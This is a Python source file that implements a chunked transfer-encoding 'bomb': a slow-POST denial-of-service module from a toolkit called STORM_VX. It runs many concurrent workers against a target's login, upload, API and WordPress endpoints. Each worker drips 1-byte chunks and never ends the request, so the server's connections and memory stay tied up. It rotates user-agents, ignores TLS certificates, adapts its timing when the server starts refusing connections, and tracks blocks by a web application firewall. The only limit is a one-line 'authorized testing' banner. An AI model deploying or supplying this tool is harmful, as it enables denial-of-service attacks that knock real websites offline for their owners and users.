#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF Chunked Bomb — Chunked Transfer Encoding Bomb Attack Module        ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Sends POST requests with Transfer-Encoding: chunked, delivering       ║
║  1-byte chunks with long delays. Never sends the terminating zero      ║
║  chunk. The server must keep the connection open, buffering the         ║
║  partial request body, consuming memory and connection slots.           ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
import ssl
from typing import Dict, Optional, List
from urllib.parse import urlparse, urljoin


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class ChunkedBombAttacker:
    """
    Chunked Transfer Encoding Bomb Attack.

    Opens connections and sends POST requests with Transfer-Encoding: chunked.
    Delivers 1-byte chunks at long intervals, never sending the terminating
    zero-length chunk ("0\\r\\n\\r\\n"). The server must hold the connection
    open and buffer the partial request, consuming resources indefinitely.

    Target endpoints: /, /login, /api/, /upload
    Each worker holds one connection open at a time.

    ArvanCloud blocking codes: 403, 429, 500, 503
    """

    TARGET_ENDPOINTS = [
        "/", "/login", "/api/", "/upload", "/api/v1/data",
        "/api/upload", "/submit", "/post", "/form", "/contact",
        "/api/users", "/auth/login", "/wp-admin/admin-post.php",
        "/xmlrpc.php", "/api/json", "/graphql",
    ]

    CHUNK_PAYLOADS = [
        "X", "A", "0", "\x00", "\xff", " ", "\n",
        "{", "}", "a", "1", "!", "?", "#",
    ]

    def __init__(self, url: str, workers: int = 100, chunk_delay: float = 5.0, timeout: int = 300):
        self.url = url
        self.workers = workers
        self.chunk_delay = chunk_delay  # Seconds between each 1-byte chunk
        self.timeout = timeout  # Max seconds to hold a connection
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.is_ssl = self.parsed.scheme == "https"

        # Stats tracking
        self.stats = {
            "active_bombs": 0,
            "total_bombs_planted": 0,
            "chunks_sent": 0,
            "completed": 0,  # Connections that ended (server closed/timeout)
            "timeouts": 0,
            "server_errors": 0,
            "connection_refused": 0,
            "waf_blocked": 0,
            "errors": 0,
            "server_overwhelmed": False,
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0
        self._current_chunk_delay = chunk_delay

    async def _update_stats(self, key: str, delta: int = 1):
        """Thread-safe stats update."""
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _set_stats(self, key: str, value):
        """Thread-safe stats set."""
        async with self._lock:
            self.stats[key] = value

    async def _get_stats(self) -> Dict:
        """Get a copy of current stats."""
        async with self._lock:
            return dict(self.stats)

    def _build_chunked_headers(self, endpoint: str) -> bytes:
        """Build POST request headers with Transfer-Encoding: chunked."""
        path = endpoint
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {random_ua()}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        return request.encode("utf-8")

    def _build_one_byte_chunk(self) -> bytes:
        """Build a single 1-byte chunk: '1\\r\\nX\\r\\n'."""
        payload = random.choice(self.CHUNK_PAYLOADS)
        return f"1\r\n{payload}\r\n".encode("utf-8")

    async def _auto_adjust_delay(self):
        """Auto-adjust chunk delay based on server behavior."""
        stats = await self._get_stats()
        refused = stats.get("connection_refused", 0)
        errors = stats.get("server_errors", 0)
        completed = stats.get("completed", 0)

        # If server is refusing connections = we're overwhelming it
        if refused > 3:
            self._current_chunk_delay = min(self._current_chunk_delay * 1.3, 30.0)
            await self._set_stats("server_overwhelmed", True)

        # If server errors are high, slow down to keep connections alive longer
        elif errors > 10:
            self._current_chunk_delay = min(self._current_chunk_delay * 1.1, 20.0)

        # If connections are completing too fast (server closing them),
        # try shorter delays to send more chunks before server closes
        elif completed > stats.get("active_bombs", 0) * 2:
            self._current_chunk_delay = max(self._current_chunk_delay * 0.9, 1.0)

    async def _chunked_bomb_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that plants one chunked bomb at a time."""
        while not stop_event.is_set():
            endpoint = random.choice(self.TARGET_ENDPOINTS)
            # Add cache buster
            endpoint = f"{endpoint}{'&' if '?' in endpoint else '?'}_={random.randint(100000, 999999)}"

            reader: Optional[asyncio.StreamReader] = None
            writer: Optional[asyncio.StreamWriter] = None

            try:
                # Open connection
                if self.is_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port, ssl=ssl_ctx),
                        timeout=15,
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port),
                        timeout=15,
                    )

                await self._update_stats("active_bombs")
                await self._update_stats("total_bombs_planted")

                # Send POST headers with chunked encoding
                headers = self._build_chunked_headers(endpoint)
                writer.write(headers)
                await writer.drain()

                # Send 1-byte chunks with delay, never send terminating chunk
                connection_start = time.time()
                chunks_sent = 0

                while not stop_event.is_set():
                    elapsed = time.time() - connection_start

                    # Check if we've held the connection long enough
                    if elapsed >= self.timeout:
                        await self._update_stats("timeouts")
                        break

                    # Send a 1-byte chunk
                    try:
                        chunk = self._build_one_byte_chunk()
                        writer.write(chunk)
                        await writer.drain()
                        chunks_sent += 1
                        await self._update_stats("chunks_sent")

                    except (ConnectionResetError, BrokenPipeError):
                        # Server closed connection — it dropped our bomb
                        await self._update_stats("server_errors")
                        break

                    # Wait before sending next chunk (the "bomb" part)
                    await asyncio.sleep(self._current_chunk_delay)

                    # Periodically check if server sent a response
                    # (e.g., WAF block page, error)
                    if chunks_sent % 5 == 0:
                        try:
                            data = await asyncio.wait_for(reader.read(1024), timeout=0.5)
                            if data:
                                response_str = data.decode("utf-8", errors="ignore")
                                # Check for WAF block
                                if any(code in response_str for code in ["403", "429", "500", "503"]):
                                    await self._update_stats("waf_blocked")
                                    break
                        except asyncio.TimeoutError:
                            pass  # No data yet — connection still open, good!
                        except (ConnectionResetError, BrokenPipeError):
                            await self._update_stats("server_errors")
                            break

            except ConnectionRefusedError:
                await self._update_stats("connection_refused")
                await self._set_stats("server_overwhelmed", True)
                await asyncio.sleep(random.uniform(0.5, 2.0))

            except asyncio.TimeoutError:
                await self._update_stats("errors")

            except OSError:
                await self._update_stats("errors")

            except Exception:
                await self._update_stats("errors")

            finally:
                await self._update_stats("active_bombs", -1)
                await self._update_stats("completed")

                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

            # Brief pause before planting next bomb
            if not stop_event.is_set():
                await asyncio.sleep(random.uniform(0.01, 0.05))

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            active = stats.get("active_bombs", 0)
            total = stats.get("total_bombs_planted", 0)
            chunks = stats.get("chunks_sent", 0)
            completed = stats.get("completed", 0)
            refused = stats.get("connection_refused", 0)
            blocked = stats.get("waf_blocked", 0)
            errors = stats.get("server_errors", 0)
            overwhelmed = stats.get("server_overwhelmed", False)

            status_color = C.R if overwhelmed else C.G if active > 50 else C.Y

            print(
                f"{C.M}[CHUNKED-BOMB]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Active: {status_color}{active}{C.RS} | "
                f"Planted: {C.W}{total}{C.RS} | "
                f"Chunks: {C.CY}{chunks:,}{C.RS} ({chunks/max(elapsed,1):.1f}/s) | "
                f"Refused: {C.R if refused > 0 else C.DM}{refused}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"SErrors: {C.Y}{errors}{C.RS} | "
                f"Delay: {C.B}{self._current_chunk_delay:.1f}s{C.RS}"
            )

            if overwhelmed:
                print(f"  {C.R}{C.BD}SERVER IS OVERWHELMED — refusing connections!{C.RS}")

            await self._auto_adjust_delay()
            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[CHUNKED-BOMB] Starting Chunked Transfer Encoding bomb attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}:{self.port}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Chunk delay: {C.W}{self.chunk_delay}s{C.RS}")
        print(f"  Connection timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Strategy: Send 1-byte chunks with delays, never terminate{C.RS}")
        print(f"  Endpoints: {C.DM}{', '.join(self.TARGET_ENDPOINTS[:6])}...{C.RS}")

        # Launch worker tasks
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._chunked_bomb_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["bombs_per_second"] = round(
            final_stats.get("total_bombs_planted", 0) / max(elapsed, 1), 2
        )
        final_stats["chunks_per_second"] = round(
            final_stats.get("chunks_sent", 0) / max(elapsed, 1), 2
        )
        final_stats["avg_chunks_per_bomb"] = round(
            final_stats.get("chunks_sent", 0) / max(final_stats.get("total_bombs_planted", 1), 1), 2
        )

        print(f"\n{C.BD}[CHUNKED-BOMB] Attack finished{C.RS}")
        print(f"  Total bombs planted: {C.W}{final_stats.get('total_bombs_planted', 0)}{C.RS}")
        print(f"  Total chunks sent: {C.CY}{final_stats.get('chunks_sent', 0):,}{C.RS}")
        print(f"  Connections refused: {C.R}{final_stats.get('connection_refused', 0)}{C.RS}")
        print(f"  Server overwhelmed: {C.R if final_stats.get('server_overwhelmed') else C.G}{final_stats.get('server_overwhelmed')}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('waf_blocked', 0)}{C.RS}")
        print(f"  Server errors: {C.Y}{final_stats.get('server_errors', 0)}{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
